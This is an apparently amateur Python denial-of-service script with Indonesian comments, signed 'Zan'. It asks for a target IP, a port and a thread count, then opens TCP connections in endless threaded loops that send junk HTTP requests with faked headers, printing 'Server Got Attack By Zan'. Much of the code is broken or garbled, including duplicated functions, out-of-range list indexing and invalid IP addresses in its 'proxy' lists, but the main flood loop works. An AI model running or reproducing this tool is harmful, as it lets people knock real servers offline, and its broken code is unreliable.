#Ddos Dulu biar gacor
import threading
import time
import os, sys
import socket
import random, requests

useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"]
ref=['http://www.bing.com/search?q=',
'https://www.ndex.com/ndsearch?text=',
'https://duckduckgo.com/?q=']
socks5=[""" 192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389"""]
acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
"Accept-Encoding: gzip, deflate\r\n",
"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
"Accept-Language: en-US,en;q=0.5\r\n"]
socks2 = [""" 193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443
193.662.17.1:443 
172.108.22.1:443 
187.234.23.1:80 
189.22.64.27:17091 
38.23.1.50:443 """]
ip = str(input("Ip >= "))
port = int(input("port >= "))
th = int(input("Thread/t >="))
pack = int(input("Pack/s >="))

def spoof():
  global byte1
  a1 = random.randint(0, 255)
  a2 = random.randint(0, 255)
  a3 = random.randint(0, 255)
  a4 = random.randint(0, 255)
  
  byte1 = random._urandom(55041)
 
  yt = [""" gacor by zan """]
  
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

  return byte1
  
  
def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(0, 255))
    addr[4] = str(random.randrange(2, 254))
    acces =  addr[1] + d + addr[2] + d + addr[3] + d + addr[4]
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    return acces
 
def spoofer2():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(0, 255))
    addr[4] = str(random.randrange(2, 254))
    acces =  addr[1] + d + addr[2] + d + addr[3] + d + addr[4]
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    return acces

def spoofer4():
    global byte6,byte5,byte4,byte8
    byte5 = random._urandom(5491)
    byte6 = random._urandom(29111)
    byte4 = random._urandom(64291)
    byte8 = random._urandom(25126)
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(0, 255))
    addr[4] = str(random.randrange(2, 254))
    addr[5] = str(random.randrange(2, 254))
    acces =  addr[1] + d + addr[2] + d + addr[3] + d + addr[4] + d +addr[5]
    accebles = byte5 + byte6 + byte4 + byte8 + "\r\n"
    cer = accebles + acces
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    return acces
    return accebles
    return byte6
    return byte5
    return byte4
    return byte8
def spoofer4():
    global byte5
    time.sleep(0.02)
    byte5 = random._urandom(5491)
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(0, 255))
    addr[4] = str(random.randrange(2, 254))
    addr[5] = str(random.randrange(2, 254))
    acces =  addr[1] + d + addr[2] + d + addr[3] + d + addr[4] + d +addr[5]
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    return acces
    return byte5
def start2():
  global useragents, acceptall, ref, socks5
  global byte3, byte4, byte_host
  byte3 = random._urandom(40552)
  byte4 = random.choice(acceptall)+random.choice(ref)
  reef = random.choice(ref)
  acceppt = random.choice(socks5)+random.choice(acceptall)+random.choice(ref)+"\r\n"
  byte_host = byte3 + byte4 + reef + acceppt + "\r\n"
  return byte_host
  while True:
            try:
               s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
               s.connect((str(ip),int(port)))
               s.send(byte_host)
               for i in range(pack):
                   s.send(byte_host)
                   xx += random.randint(0, int(pack))
                   print("Server Got Attack By Zan ")
            except:
                  pass
                  
  return byte3
  return byte4
 
  byte7 = random._urandom(1024)
 
def spoofer4():
  global byte7, byte8, byte9
  global useragents, socks2, socks5, ref, acceptall
  byte8 = random._urandom(8901)
  byte9 = random._urandom(4455)
  Socks0 = random.choice(useragents)+random.choice(socks2)+random.choice(socks5)+random.choice(acceptall)+"\r\n"
  Socks8 = random.choice(ref)+random.choice(Socks0)
  content    = "Content-Type: application/x-www-form-urlencoded\r\n"
  length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
  target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
  byte_lie = Socks0 + Socks8 + content + length +target_host + "\r\n"
  while True:
        try:
           s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
           s.connect((str(ip),int(port)))
           s.send(str.encode(byte_lie))
           s.send(str.encode(byte_lie))
           s.send(str.encode(byte_lie))
           s.sendall(byte7)
           s.sendall(byte7)
           for i in range(25000):
               s.connect((str(ip),int(port)))
               s.send(str.encode(byte_lie))
               s.send(str.encode(byte_lie))
               s.send(str.encode(byte_lie))
               s.sendall(byte7)
               s.sendall(byte7)
           print("Server Got Attack By Zan ")
        except:
              pass      


def start1():
  global useragents, acceptall, ref, socks5
  global hh, byte2, socks2, byte3
  hh = random._urandom(75006)
  byte2 = random._urandom(34002)
  xx = int(0)
  byte3 = "Sockets2: "+random.choice(useragents)+random.choice(acceptall)+random.choice(ref)+random.choice(socks5)+random.choice(socks2)+"\r\n"
  userKagen = "UserAgents: "+random.choice(useragents)+random.choice(acceptall)+random.choice(ref)+"\r\n"
  Userkw = "Binatang: "+random.choice(socks5)+random.choice(ref)+random.choice(useragents)+random.choice(acceptall)+"\r\n"
  acceptser = "AcceptAdmin: "+random.choice(acceptall)+random.choice(ref)+"\r\n"
  referrer = random.choice(ref)
  content    = "Content-Type: application/x-www-form-urlencoded\r\n"
  length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
  target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
  main_host = userKagen + acceptser + referrer + content + length + Userkw + target_host + "\r\n"
  while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(ip),int(port)))
            s.send(str.encode(main_host))
            for i in range(pack):
                s.send(str.encode(main_host))
            print("Server Got Attack By Zan ")
        except:
              pass
def start2():
  global useragents, acceptall, ref, socks5
  global hh, byte2, socks2, byte3
  hh = random._urandom(75006)
  byte2 = random._urandom(34002)
  xx = int(0)
  byte3 = "Sockets2: "+random.choice(useragents)+random.choice(acceptall)+random.choice(ref)+random.choice(socks5)+random.choice(socks2)+"\r\n"
  userKagen = "UserAgents: "+random.choice(useragents)+random.choice(acceptall)+random.choice(ref)+"\r\n"
  Userkw = "Binatang: "+random.choice(socks5)+random.choice(ref)+random.choice(useragents)+random.choice(acceptall)+"\r\n"
  acceptser = "AcceptAdmin: "+random.choice(acceptall)+random.choice(ref)+"\r\n"
  referrer = random.choice(ref)
  content    = "Content-Type: application/x-www-form-urlencoded\r\n"
  length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
  target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
  main_host = userKagen + acceptser + referrer + content + length + Userkw + target_host + "\r\n"
  while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(ip),int(port)))
            s.send(str.encode(main_host))
            for i in range(pack):
                s.send(str.encode(main_host))
            print("Server Got Attack By Zan ")
        except:
              pass

def start():
  global useragents, acceptall, ref, socks5
  global hh, byte2, socks2, byte3
  hh = random._urandom(75006)
  byte2 = random._urandom(34002)
  xx = int(0)
  byte3 = "Sockets2: "+random.choice(useragents)+random.choice(acceptall)+random.choice(ref)+random.choice(socks5)+random.choice(socks2)+"\r\n"
  userKagen = "UserAgents: "+random.choice(useragents)+random.choice(acceptall)+random.choice(ref)+"\r\n"
  Userkw = "Binatang: "+random.choice(socks5)+random.choice(ref)+random.choice(useragents)+random.choice(acceptall)+"\r\n"
  acceptser = "AcceptAdmin: "+random.choice(acceptall)+random.choice(ref)+"\r\n"
  referrer = random.choice(ref)
  content    = "Content-Type: application/x-www-form-urlencoded\r\n"
  length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
  target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
  main_host = userKagen + acceptser + referrer + content + length + Userkw + target_host + "\r\n"
  while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(ip),int(port)))
            s.send(str.encode(main_host))
            for i in range(pack):
                s.send(str.encode(main_host))
            print("Server Got Attack By Zan ")
        except:
              pass
            
for i in range(th):
  th1 = threading.Thread(target=start)
  th1.start()

  #aku mah pemula bisa apa?
